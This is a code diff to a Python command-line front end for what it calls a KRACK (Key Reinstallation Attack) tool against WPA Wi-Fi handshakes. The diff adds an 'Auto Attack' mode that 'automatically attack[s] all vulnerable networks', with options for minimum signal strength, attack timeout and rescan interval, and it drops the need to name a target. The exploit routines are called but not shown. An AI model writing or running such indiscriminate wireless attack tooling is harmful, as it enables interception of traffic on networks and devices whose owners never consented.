@@ -69,7 +69,8 @@ def select_attack_type():
         ("2", "4-Way Handshake (Encrypted)", "Attack using encrypted retransmission"),
         ("3", "Group Key (Immediate)", "Group key attack with immediate installation"),
         ("4", "Group Key (Delayed)", "Group key attack with delayed installation"),
-        ("5", "Fast BSS Transition", "Attack the Fast BSS Transition handshake")
+        ("5", "Fast BSS Transition", "Attack the Fast BSS Transition handshake"),
+        ("6", "Auto Attack", "Automatically attack all vulnerable networks")
     ]
     
     for id, name, desc in attacks:
@@ -78,7 +79,7 @@ def select_attack_type():
     console.print(table)
     choice = Prompt.ask(
         "Select attack type",
-        choices=["1", "2", "3", "4", "5"],
+        choices=["1", "2", "3", "4", "5", "6"],
         default="1"
     )
     return int(choice)
@@ -88,7 +89,10 @@ def select_attack_type():
 @click.option('--ap-mac', callback=validate_mac, help='Target AP MAC address')
 @click.option('--client-mac', callback=validate_mac, help='Target client MAC address')
 @click.option('--scan/--no-scan', default=True, help='Scan for targets before attack')
-def main(interface, ap_mac, client_mac, scan):
+@click.option('--min-signal', default=-70, help='Minimum signal strength for auto attack mode (dBm)')
+@click.option('--attack-timeout', default=300, help='Timeout for each attack attempt in auto mode (seconds)')
+@click.option('--scan-interval', default=60, help='Interval between network scans in auto mode (seconds)')
+def main(interface, ap_mac, client_mac, scan, min_signal, attack_timeout, scan_interval):
     """KRACK (Key Reinstallation Attack) Tool"""
     print_banner()
     
@@ -118,26 +122,34 @@ def main(interface, ap_mac, client_mac, scan):
             if not client_mac:
                 client_mac = Prompt.ask("Enter client MAC address")
     
-    # Ensure we have target addresses
-    if not ap_mac or not client_mac:
-        console.print("[red]Error: Both AP and client MAC addresses are required.[/red]")
-        sys.exit(1)
-    
     # Select attack type
     attack_type = select_attack_type()
     
     # Execute selected attack
     try:
-        if attack_type == 1:
-            ka.four_way_handshake_plaintext_retransmission(interface, ap_mac, client_mac)
-        elif attack_type == 2:
-            ka.four_way_handshake_encrypted_retransmission(interface, ap_mac, client_mac)
-        elif attack_type == 3:
-            ka.group_key_handshake_immediate_install(interface, ap_mac)
-        elif attack_type == 4:
-            ka.group_key_handshake_delayed_install(interface, ap_mac)
-        elif attack_type == 5:
-            ka.fast_bss_transition_attack(interface, ap_mac, client_mac)
+        if attack_type == 6:  # Auto Attack
+            ka.auto_attack(
+                interface,
+                min_signal=min_signal,
+                attack_timeout=attack_timeout,
+                scan_interval=scan_interval
+            )
+        else:
+            # Ensure we have target addresses for non-auto attacks
+            if not ap_mac or (not client_mac and attack_type not in [3, 4]):
+                console.print("[red]Error: Both AP and client MAC addresses are required for this attack type.[/red]")
+                sys.exit(1)
+            
+            if attack_type == 1:
+                ka.four_way_handshake_plaintext_retransmission(interface, ap_mac, client_mac)
+            elif attack_type == 2:
+                ka.four_way_handshake_encrypted_retransmission(interface, ap_mac, client_mac)
+            elif attack_type == 3:
+                ka.group_key_handshake_immediate_install(interface, ap_mac)
+            elif attack_type == 4:
+                ka.group_key_handshake_delayed_install(interface, ap_mac)
+            elif attack_type == 5:
+                ka.fast_bss_transition_attack(interface, ap_mac, client_mac)
     except KeyboardInterrupt:
         console.print("\n[yellow]Attack interrupted by user.[/yellow]")
     except Exception as e:
